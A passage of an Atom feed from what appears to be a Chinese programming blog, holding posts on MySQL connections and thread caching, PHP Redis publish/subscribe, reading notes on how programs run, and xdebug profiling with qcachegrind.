毫秒足以让比特传播接近地球赤道半径的距离。</p><p>Q：缓存的目的？<br>A：缓存的目的就是把需要花费昂贵开销的计算结果保存起来，在以来需要的时候直接取出，避免重复计算。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;《构建高性能 Web 站点》读书笔记&lt;/p&gt;</summary>
    
    
    
    <category term="读书笔记" scheme="https://www.0x2beace.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="读书笔记" scheme="https://www.0x2beace.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>PHP 中实现 Mysql 连接池与持久化</title>
    <link href="https://www.0x2beace.com/mysql-connection-pool-and-persistence-in-php/"/>
    <id>https://www.0x2beace.com/mysql-connection-pool-and-persistence-in-php/</id>
    <published>2021-02-03T11:42:17.000Z</published>
    <updated>2021-02-03T12:46:55.581Z</updated>
    
    <content type="html"><![CDATA[<p>Mysql 的连接方式有两种：tcp 和 socket。前者是基于<code>tcp/ip</code>协议，后者是基于socket 套接字。</p><a id="more"></a><p>具体：</p><ul><li>tcp/ip：<code>mysql -h 127.0.0.1 -uroot -p</code></li><li>socket：<code>mysql -h localhost -uroot -p</code> 或者 <code>mysql -uroot -p</code></li></ul><p>可以通过 <code>tcpdump</code>命令抓包。</p><p>指定源端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tcpdump -i lo0 port 3306</span><br></pre></td></tr></table></figure><p>如果出现以下内容，表示本地没有<code>lo0</code>这个设备。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcpdump: lo: No such device exists</span><br><span class="line">(BIOCSETIF failed: Device not configured)</span><br></pre></td></tr></table></figure><p>可以通过<code>tcpdump -D</code> 命令查看本地设备名称：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.en0 [Up, Running]</span><br><span class="line">2.lo0 [Up, Running, Loopback]</span><br></pre></td></tr></table></figure><p>使用<code>mysql -h 127.0.0.1 -uroot -p</code>，可以看到Mysql 的连接过程是基于<code>tcp/ip</code> 协议。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210118172506.png" alt=""></p><p>当客户端退出Mysql 时，会发送四条记录，也就是tcp 的四次挥手。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210118172203.png" alt=""></p><p><code>socket</code> 方式会快于<code>tcp/ip</code>，</p><p>mysql 使用线程来处理连接，每当一个请求进来，MySQL会创建一个线程去处理请求，</p><p>可以使用<code>show status</code>命令查看当前处于连接状态的线程个数，所以在高并发下，这将给MySQL服务器带来巨大的压力，消耗服务器资源。</p><h3 id="Mysql-线程池"><a href="#Mysql-线程池" class="headerlink" title="Mysql 线程池"></a>Mysql 线程池</h3><p>实际上 mysql 实现了线程池，当客户端断开连接后，mysql 会将当前线程缓存起来，当下一次有新的请求进来时，无需创建新的线程。</p><p>查看线程池大小：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &#39;thread_cache_size&#39;;</span><br></pre></td></tr></table></figure><p>设置线程池大小：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; set global thread_cache_size &#x3D; 20;</span><br></pre></td></tr></table></figure><p>查看线程池状态：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show status like &#39;Threads_%&#39;;</span><br><span class="line">+-------------------+-------+</span><br><span class="line">| Variable_name     | Value |</span><br><span class="line">+-------------------+-------+</span><br><span class="line">| Threads_cached    | 8     |</span><br><span class="line">| Threads_connected | 3     |</span><br><span class="line">| Threads_created   | 53    |</span><br><span class="line">| Threads_running   | 1     |</span><br><span class="line">+-------------------+-------+</span><br><span class="line">4 rows in set (0.02 sec)</span><br></pre></td></tr></table></figure><p>其中：</p><ul><li><code>Threads_cached</code>：空闲线程数量。当有新的请求进来时，mysql 不会立即创建线程去处理，而是去<code>Threads_cached</code>查看空闲的连接线程，如果存在则直接使用，不存在则创建新的线程。</li><li><code>Threads_connected</code>：当前处于连接状态的线程个数。</li><li><code>Threads_created</code>：创建过的线程数，如果发现<code>Threads_created</code>值过大的话，表明 mysql 服务器一直在创建线程，这也是比较耗资源，可以适当增加配置文件中<code>Thread_cache_size</code>值。</li><li><code>Threads_running</code>：处于激活状态的线程的个数，这个一般都是远小于<code>Threads_connected</code>的。</li></ul><p>线程池的出现解决了频繁的创建连接和销毁连接的问题，但仅有线程池还是不够的，不能解决客户端频繁连接mysql 带来的性能损耗。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.wugenglong.com/post/mysql_connection_pool/" target="_blank" rel="noopener">PHP中实现MySQL连接池与持久化</a></li><li><a href="https://my.oschina.net/u/2394701/blog/2046414" target="_blank" rel="noopener">用Swoole4 打造高并发的PHP协程Mysql连接池</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;Mysql 的连接方式有两种：tcp 和 socket。前者是基于&lt;code&gt;tcp/ip&lt;/code&gt;协议，后者是基于socket 套接字。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Mysql" scheme="https://www.0x2beace.com/tags/Mysql/"/>
    
  </entry>
  
  <entry>
    <title>PHP 实践 Redis 发布订阅</title>
    <link href="https://www.0x2beace.com/php-practice-redis-publish-and-subscribe/"/>
    <id>https://www.0x2beace.com/php-practice-redis-publish-and-subscribe/</id>
    <published>2021-01-22T14:57:36.000Z</published>
    <updated>2021-01-22T14:58:49.610Z</updated>
    
    <content type="html"><![CDATA[<p>Redis 集成了Pub/Sub功能（means Publish, Subscribe）即发布及订阅功能。</p><a id="more"></a><p>Redis 有各种语言的客户端，这里仅以PHP 的客户端来了解Redis 的发布订阅。</p><p>发布者：即publish客户端，无需独占链接，你可以在publish消息的同时，使用同一个redis-client链接进行其他操作（例如：INCR等）</p><p>订阅者：即subscribe客户端，需要独占链接，即进行subscribe期间，redis-client无法穿插其他操作，此时client以阻塞的方式等待“publish端”的消息；<br>这一点很好理解，因此subscribe端需要使用单独的链接，甚至需要在额外的线程中使用。</p><h2 id="终端实现"><a href="#终端实现" class="headerlink" title="终端实现"></a>终端实现</h2><p>订阅者订阅频道：<br><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210122165931.png" alt=""></p><p>发布者向频道中发送内容<br><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210122170004.png" alt=""></p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>subscribe 客户端：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$redis &#x3D; getConnect();</span><br><span class="line">$redis-&gt;setOption(Redis::OPT_READ_TIMEOUT, -1); </span><br><span class="line"></span><br><span class="line">$redis-&gt;subscribe([&quot;channel1&quot;], function ($instance, $chan, $msg) &#123;</span><br><span class="line">echo $msg;</span><br><span class="line">&#x2F;**</span><br><span class="line"> * $instance 是上面创建的Redis 实例对象，因为独占链接的关系，该实例不能执行其他操作。</span><br><span class="line"> * 如果要使用Redis，需新建一个连接</span><br><span class="line"> *&#x2F;</span><br><span class="line">$redis &#x3D; getConnect();</span><br><span class="line">$redis-&gt;get(&quot;name&quot;);</span><br><span class="line">&#x2F;&#x2F; todo 业务逻辑</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">function getConnect()</span><br><span class="line">&#123;</span><br><span class="line">$redis &#x3D; new Redis();</span><br><span class="line">$redis-&gt;connect(&quot;127.0.0.1&quot;, 6379);</span><br><span class="line">$redis-&gt;auth(&quot;&quot;);</span><br><span class="line">return $redis;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>publish 客户端：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$redis &#x3D; new Redis();</span><br><span class="line">$redis-&gt;connect(&quot;127.0.0.1&quot;, 6379);</span><br><span class="line"></span><br><span class="line">$redis-&gt;publish(&#39;channel1&#39;, &#39;hello, redis&#39;);</span><br></pre></td></tr></table></figure><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>subscribe 客户端需要手动设置不超时，有两种方式：</p><ol><li><code>ini_set(&#39;default_socket_timeout&#39;, -1)</code></li><li><code>$redis-&gt;setOption(Redis::OPT_READ_TIMEOUT, -1)</code></li></ol><p>如果不设置不超时，60s后会报一个错误：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fatal error: Uncaught RedisException: read error on connection to 127.0.0.1:6379</span><br></pre></td></tr></table></figure><p>方式一是通过临时修改 <code>php.ini</code> 配置项，<code>default_socket_timeout</code>默认为 60s 。</p><p><code>default_socket_timeout</code> 是socket流的超时参数，即socket流从建立到传输再到关闭整个过程必须要在这个参数设置的时间以内完成，如果不能完成，那么PHP将自动结束这个socket并返回一个警告。</p><p>推荐第二种，因为方式二是通过修改redis的配置项，因此仅对redis连接生效，相对于方式一，不会产生意外的对其他部分的影响。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://segmentfault.com/a/1190000020385114" target="_blank" rel="noopener">php实现redis消息发布订阅</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;Redis 集成了Pub/Sub功能（means Publish, Subscribe）即发布及订阅功能。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    <category term="Redis" scheme="https://www.0x2beace.com/categories/PHP/Redis/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Redis" scheme="https://www.0x2beace.com/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>《程序是怎样跑起来的》读书笔记</title>
    <link href="https://www.0x2beace.com/How-does-the-program-run-reading-notes/"/>
    <id>https://www.0x2beace.com/How-does-the-program-run-reading-notes/</id>
    <published>2021-01-21T14:01:32.000Z</published>
    <updated>2021-02-03T12:47:57.415Z</updated>
    
    <content type="html"><![CDATA[<p>《程序是怎样跑起来的》读书笔记</p><a id="more"></a><h2 id="CPU"><a href="#CPU" class="headerlink" title="CPU"></a>CPU</h2><p>CPU（计算机）能够直接识别和执行的只有机器语言。使用 C、Java 等语 言编写的程序，最后都会转化成机器语言。</p><p>CPU 和内存是由许多晶体管组成的电子部件，通常称为 IC (Integrated Circuit，集成电路)。</p><p>CPU 的内部由寄存器、控制器、运算器和时钟四个部分构成，各部分之间 由电流信号相互连通。</p><ul><li>寄存器： 寄存器可用来暂存<strong>指令</strong>、<strong>数据</strong>等处理对象，可以将其看作是内存的一种。根据种类的不同，一个 CPU 内部会有20~100 个寄存器。</li><li>控制器：控制器负责把内存上的指令、数据等读入寄存器，并根据指令的执行结果来控制整个计算机。</li><li>运算器：运算器负责运算从内存读入寄存器的数据。 </li><li>时钟：时钟负责发出 CPU 开始计时的时钟信号。</li></ul><p>时钟信号英文叫作 clock puzzle。Pentium 2 GHz 表示时钟信号的频率为 2 GHz(1 GHz = 10 亿次 / 秒)。也就是说，时钟信号的频率越高，CPU 的 运行速度越快。</p><p>通常我 们将汇编语言编写的程序转化成机器语言的过程称为 汇编;反之，机器语言程序转化成汇编语言程序的过程则称为 反汇编。</p><p>高级语言编写的程序 =》经过编译转换为机器语言=》CPU内部的寄存器来进行处理。</p><p>编译指的是使用高级编程语言编写的程序转换为机器语言的过程，其中，用于转换的程序被称为编译器。</p><p>对于程序员来说，CPU 是什么呢？CPU 是具有各种功能的寄存器的集合体，所以可以将寄存器理解成是CPU 的核心，主要承担着指令、数据的处理。</p><p>二进制转十进制的方式：即各位数的数值和位权相乘后再相加的数值。</p><p>位权的概念：39 = 3 * 10 + 9 * 1 其中 10 和 1 就是位权。<br>在十进制中，第 1 位(最右边的一位) 是 10 的 0 次幂 A(= 1)，第 2 位是 10 的 1 次幂(= 10)，第 3 位是 10 的 2 次幂(= 100)。</p><p>在二进制中，第 1 位是 2 的 0 次幂 (= 1)，第2位是2的1次幂(= 2)，这就是位权。</p><p>无论程序中使用的是多少进制，计算机最终都会转换为二进制来处理。</p><h2 id="二进制"><a href="#二进制" class="headerlink" title="二进制"></a>二进制</h2><p>二进制的运算方式是：<br>对于十进制，进行加法运算时逢十进一，进行减法运算时借一当十；<br>对于二进制，进行加法运算时逢二进一，进行减法运算时借一当二。</p><p>二进制数中表示负数值时，一般会把最高位作为符号来使用，因此我们把这个最高位称为符号位。 符号位是 0 时表示正数 ，符号位是 1 时表示负数。</p><p>将二进制数的值取反后加 1 的结果，和原来的值相加，结果为0 。<br>实际上就是1 + (-1) = 0</p><h3 id="计算机进行小数运算"><a href="#计算机进行小数运算" class="headerlink" title="计算机进行小数运算"></a>计算机进行小数运算</h3><blockquote><p>为什么将0.1 累加一百次无法得到 10？</p></blockquote><p>这是因为计算机无法准确用二进制表示 0.1，</p><p>十进制的0.1 转换成二进制后，会变成<code>0.00011001100...</code>(1100 循环)这样的 循环小数，这和无法用十进制准确表示 1/3 一样的道理。</p><p>因此，在 遇到循环小数时，计算机就会根据变量数据类型所对应的长度将数值 从中间截断或者四舍五入。</p><p>小 数 点 后 4 位 用 二 进 制 数 表 示 时 的 数 值 范 围 为 <code>0.0000~0.1111</code>。因此，这里只能表示 0.5、0.25、0.125、0.0625 这四个 二进制数小数点后面的位权组合而成(相加总和)的小数。</p><p>所以0.5 累加一百次可以到的 50，而0.1 累加一百次则会丢失精度。</p><h4 id="二进制和十进制"><a href="#二进制和十进制" class="headerlink" title="二进制和十进制"></a>二进制和十进制</h4><p>在实际的程序中，往往不会直接使用二进制来表示，因为太长了，一个二进制就需要八位来表示。</p><p>二进制数的 4 位，正好相当于十六进制数的 1 位。</p><h2 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h2><p>其实，从物理上来看，内存的构造非常简单。只要在程序上花一些心思，就可以将内存变换成各种各样的数据结构来使用。</p><p>内存实际上是一种名为内存 IC 的电子元件。</p><p>内存 IC 中有电源、地址信号、数据信号、控制信号等用于输入输出的大量引脚(IC 的引脚)，通过为其指定地址(address)，来进行数据的读写。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210121215618.png" alt=""></p><p>那么，这个内存IC 中能存放多少数据呢？</p><ol><li>数据信号引脚有 D0~D7共八个，表示一次可以输入输出 8 位(= 1 字节)的数据。</li><li>地址信<br>号引脚有 A0<del>A9 共十个，表示可以指定 `0000000000</del>1111111111` 共1024 个地址。</li><li>而地址是用来表示数据的存储场所，因此我们可以得出这 A个内存 IC 中可以存储 1024 个 1 字节的数据。因为 1024 = 1K，所以改内存IC 的容量是1KB。</li></ol><h3 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h3><p>指针也是一种变量，它所表示的不是数据的值，而是存储着数据的内存的地址。</p><p>通过使用指针，就可以对任意指定地址的数据进行读写。</p><p>数组的定义中所指定的数据类型，也表示一次能够读写的内存大小。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210121215650.png" alt=""></p><p>高级编程语言的数组则完全省略了这些概念，直接定义一个数组，就可以放入任意类型的数据（int、float、double、string、object等）。</p><p>指针的概念也是类似，指针的数据类型表示一次可以读写的长度。</p><h3 id="栈、队列及环形缓冲区"><a href="#栈、队列及环形缓冲区" class="headerlink" title="栈、队列及环形缓冲区"></a>栈、队列及环形缓冲区</h3><p>栈的原意是“干草堆积如山”。干草堆积成山后，最后堆的干草会 被最先抽取出来（后进先出）。</p><p>而队列则是完全相反的一种数据结构，先进先出。</p><h2 id="内存和磁盘"><a href="#内存和磁盘" class="headerlink" title="内存和磁盘"></a>内存和磁盘</h2><h3 id="不读入内存就无法运行"><a href="#不读入内存就无法运行" class="headerlink" title="不读入内存就无法运行"></a>不读入内存就无法运行</h3><p>计算机中主要的存储部件是内存和磁盘。磁盘中存储的程序，必须要加载到内存后才能运行。</p><blockquote><p>为什么程序一定要在内存中运行？</p></blockquote><p>这是因为，这是因为负责解析和运行程序内容的CPU，需要通过内部程序计数器来指定内存地址，然后才能读出地址。</p><p>即使CPU 可以直接读出并运行磁盘中保存的程序，由于磁盘读取速度慢，程序的运行速度还是会降低。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210121215717.png" alt=""></p><p>本文中的所有图片均来自《程序是如何跑起来的》。</p><h3 id="磁盘缓存加速了磁盘访问速度"><a href="#磁盘缓存加速了磁盘访问速度" class="headerlink" title="磁盘缓存加速了磁盘访问速度"></a>磁盘缓存加速了磁盘访问速度</h3><p>磁盘缓存指的是把从磁盘中读取的数据存储到内存中的方式。</p><p>磁盘访问提高访问速度的机制：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210121215737.png" alt=""></p><h3 id="虚拟内存把磁盘作为部分内存来使用"><a href="#虚拟内存把磁盘作为部分内存来使用" class="headerlink" title="虚拟内存把磁盘作为部分内存来使用"></a>虚拟内存把磁盘作为部分内存来使用</h3><p>虚拟内存是把磁盘作为假象的内存来使用。这与磁盘缓存是假象的磁盘（实际是内存）是相对的，虚拟内存是假象的内存（实际是磁盘）。</p><h2 id="亲自尝试压缩数据"><a href="#亲自尝试压缩数据" class="headerlink" title="亲自尝试压缩数据"></a>亲自尝试压缩数据</h2><p>文件是将数据存储在磁盘等存储媒介中的一种形式，程序文件中存储数据的单位是字节。</p><p>我们把能还原到压缩前状态的压缩称为 <strong>可逆压缩</strong>，无法还原到压 缩前状态的压缩称为 <strong>非可逆压缩</strong>。</p><h2 id="从源文件到可执行文件"><a href="#从源文件到可执行文件" class="headerlink" title="从源文件到可执行文件"></a>从源文件到可执行文件</h2><p>在程序运行时，用来动态申请分配数据和对象的内存区域形式称为<strong>堆</strong>。</p><p>源代码编译 =》本地代码（机器代码）=》dump（每个字节用 2 位十六进制数来表示的方式）</p><p>仅靠编译是无法得到可执行文件的，编译器编译仅仅只是得到了本地文件，为了得到可执行文件，还需要进行”链接“处理。</p><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>在Windows 下，编译后生成的不是 EXE 文件，而是扩展名为<code>.obj</code>的目标文件，在Unix 下，编译后生成的也不是可执行文件，而是扩展名为<code>.o</code> 的目标文件。</p><p>这些文件无法直接运行，这是因为编译过程只是检查语法（函数、变量的声明）是否正确。</p><p>Mac 下编译<code>main.cpp</code> 文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -c main.cpp</span><br><span class="line">$ ls </span><br><span class="line">main.cpp  main.o</span><br></pre></td></tr></table></figure><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p>找到所要用到函数所在的目标文件并结合，生成一个可执行文件的处理就是链接，运行连接的程序被称为链接器。</p><p>Mac 下链接<code>main.o</code> 文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ gcc main.o -o main</span><br><span class="line">$ main.cpp  main.o  main</span><br></pre></td></tr></table></figure><p>两步可以合并成一步：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ gcc main.cpp</span><br><span class="line">$ ls </span><br><span class="line">main.cpp  a.out</span><br></pre></td></tr></table></figure><p>总结：</p><ul><li><code>main.cpp</code>：源代码文件</li><li><code>main.o</code>：源代码文件编译后生成的本地代码（机器语言）</li><li><code>main</code>：可执行文件</li><li><code>a.out</code>：可执行文件（默认名称）</li></ul><p>当程序加载到内存后，除此之外还会额外生成两个组，那就是<strong>堆</strong>和<strong>栈</strong>。</p><p>栈是用来存储函数内部临时使用的变量（局部变量），以及函数调用时所用的参数的内存区域。<br>堆是用来存储程序运行时的任意数据及对象的内存领域。</p><p>无论是 C 语言还是 C++，如果没有在程序中明确释放堆的内存空间，那么即使在处理完毕后，该内存空间仍会一直残留。这个现象称为 内存泄露。</p><p>编译器和解析器的区别？<br>编译器是在程序运行之前对所有源代码进行解释处理。<br>解析器则是在运行时对源代码的内容一行一行地进行解释处理。</p><h2 id="操作系统和应用的关系"><a href="#操作系统和应用的关系" class="headerlink" title="操作系统和应用的关系"></a>操作系统和应用的关系</h2><p>操作系统本身并不是单独的程序，而是多个程序的集合体。</p><p>初期的操作系统 = 监控程序 + 基本的输入输出程序</p><p>在操作系统这个运行环境下，应用并不能直接控制硬件，而是通过操作系统来间接控制硬件。</p><p>应用程序经过 OS 间接地控制硬件：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210203110747.png" alt=""></p><h3 id="高级语言的可移植性和系统调用"><a href="#高级语言的可移植性和系统调用" class="headerlink" title="高级语言的可移植性和系统调用"></a>高级语言的可移植性和系统调用</h3><p>C 语言等高级编程语言并不依存特定的操作系统。这是因为用高级编程语言编写的应用在编译后，就转换成了利用系统调用的本地代码。</p><p>高级语言编写的函数调用在编译之后变成了系统调用：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210203111420.png" alt=""></p><h2 id="通过汇编语言了解程序的实际构成"><a href="#通过汇编语言了解程序的实际构成" class="headerlink" title="通过汇编语言了解程序的实际构成"></a>通过汇编语言了解程序的实际构成</h2><p>前面的章节已经多次提到了，计算机CPU 能直接解释运行的只有本地代码（机器语言）程序。</p><p>用C 语言等高级编程语言编写的源代码，需要通过各自的编译器编译后，转换成本地代码。</p><p>通过调查本地代码的内容，可以了解程序最终是以何种形式来运行的。但是，如果直接打开本地代码来看的话，只能看到数值的罗列。 如果直接使用这些数值来编写程序的话，还真是不太容易理解。因而 就产生了这样一种想法，那就是在各本地代码中，附带上表示其功能的英语单词缩写。</p><p>例如，在加法运算的本地代码中加上 add(addition 的缩写)、在比较运算的本地代码中加上 cmp(compare 的缩写)等。这些缩写称为 <strong>助记符</strong>，使用助记符的编程语言称为 <strong>汇编语言</strong>。</p><p>不过，即使是用汇编语言编写的源代码，最终也必须转换成本地代码才能运行。负责转换工作的程序称为<strong>汇编器</strong>，转换这一处理本身称为<strong>汇编</strong>。</p><p>用汇编语言编写的源代码，和本地代码是一一对应的。因而，本地代码也可以反过来转换成汇编语言的源代码。持有该功能的逆变换程序称为 <strong>反汇编程序</strong>，逆变换这一处理本身称为<strong>反汇编</strong>。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210203160137.png" alt=""></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;《程序是怎样跑起来的》读书笔记&lt;/p&gt;</summary>
    
    
    
    <category term="读书笔记" scheme="https://www.0x2beace.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="读书笔记" scheme="https://www.0x2beace.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>PHP + xdebug 分析代码性能瓶颈</title>
    <link href="https://www.0x2beace.com/php-analysis-code-performance-bottleneck/"/>
    <id>https://www.0x2beace.com/php-analysis-code-performance-bottleneck/</id>
    <published>2021-01-19T12:12:54.000Z</published>
    <updated>2021-01-19T12:16:37.417Z</updated>
    
    <content type="html"><![CDATA[<p>通常启用了<code>xdebug</code>插件，性能测试输出文件会伴随生成，通常是以<code>cachegrind.out.xxxx</code> 文件存在。</p><a id="more"></a><p>该文件可以通过第三方工具来进行代码性能分析。</p><p>但如果本地有多个项目/网站，所有的profile 都输出到一个文件中了，这样并不方便后面进行性能分析。</p><h3 id="自定义profile-文件名称"><a href="#自定义profile-文件名称" class="headerlink" title="自定义profile 文件名称"></a>自定义profile 文件名称</h3><p>可以通过配置<code>xdebug.profiler_output_name</code> 参数来设置输出文件名称，部分参数如下：</p><table><thead><tr><th>符号</th><th>含义</th><th>配置样例</th><th>样例文件名</th></tr></thead><tbody><tr><td>%c</td><td>当前工作目录的crc32校验值</td><td>cachegrind.out.%c</td><td>cachegrind.out.1258863198</td></tr><tr><td>%p</td><td>当前服务器进程的pid</td><td>cachegrind.out.%p</td><td>cachegrind.out.9685</td></tr><tr><td>%r</td><td>随机数</td><td>cachegrind.out.%r</td><td>cachegrind.out.072db0</td></tr><tr><td>%s</td><td>脚本文件名(注)</td><td>cachegrind.out.%s</td><td>cachegrind.out._home_httpd_html_test_xdebug_test_php</td></tr><tr><td>%t</td><td>Unix时间戳（秒）</td><td>cachegrind.out.%t</td><td>cachegrind.out.1179434742</td></tr><tr><td>%u</td><td>Unix时间戳（微秒）</td><td>cachegrind.out.%u</td><td>cachegrind.out.1179434749_642382</td></tr><tr><td>%H</td><td>$_SERVER[‘HTTP_HOST’]</td><td>cachegrind.out.%H</td><td>cachegrind.out.localhost</td></tr><tr><td>%R</td><td>$_SERVER[‘REQUEST_URI’]</td><td>cachegrind.out.%R</td><td>cachegrind.out._test_xdebug_test_php_var=1_var2</td></tr><tr><td>%S</td><td>session_id (来自$_COOKIE 如果设置了的话)</td><td>cachegrind.out.%S</td><td>cachegrind.out.c70c1ec2375af58f74b390bbdd2a679d</td></tr><tr><td>%%</td><td>%字符</td><td>cachegrind.out.%%</td><td>cachegrind.out.%%</td></tr></tbody></table><p>编辑<code>php.ini</code> 配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xdebug.profiler_output_name &#x3D; cachegrind.out.%H</span><br></pre></td></tr></table></figure><p>然后重启 php server。</p><p>在Mac 下，profile 文件存放于<code>/var/tmp/</code>目录中。</p><h3 id="性能分析"><a href="#性能分析" class="headerlink" title="性能分析"></a>性能分析</h3><p>在Mac 下，有MacCallGrind 和 qcachegrind 可以使用，不过前者是收费，直接通过Apple Store下载，后者是免费。需要手动安装。</p><p>安装graphviz，用来Call Graph功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ brew install graphviz</span><br></pre></td></tr></table></figure><p>安装 qcachegrind：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ brew install qcachegrind</span><br></pre></td></tr></table></figure><p>安装完成之后，就可以打开 <code>qcachegrind</code> 应用了，图形界面如下：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210119150021.png" alt=""></p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>不过需要注意，开启了<code>profile</code>文件输出之后，如果本地项目多的话，很容易占用磁盘大面积空间，下图是我半年左右没有清理的状态：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/%E7%A3%81%E7%9B%98.jpg" alt=""></p><p>可以使用命令进行清理：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo rm -fr &#x2F;private&#x2F;var&#x2F;tmp&#x2F;cachegrind.out.*</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://xenojoshua.com/2011/05/xdebug-php-profile-output/" target="_blank" rel="noopener">使用xdebug对php进行profile的输出</a></li><li><a href="https://segmentfault.com/a/1190000012395875" target="_blank" rel="noopener">php+xdebug+qcachegrind(mac)性能分析</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;通常启用了&lt;code&gt;xdebug&lt;/code&gt;插件，性能测试输出文件会伴随生成，通常是以&lt;code&gt;cachegrind.out.xxxx&lt;/code&gt; 文件存在。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Mac 下有哪些好用的终端工具</title>
    <link href="https://www.0x2beace.com/what-are-some-useful-terminal-tools-under-Mac/"/>
    <id>https://www.0x2beace.com/what-are-some-useful-terminal-tools-under-Mac/</id>
    <published>2021-01-12T14:33:12.000Z</published>
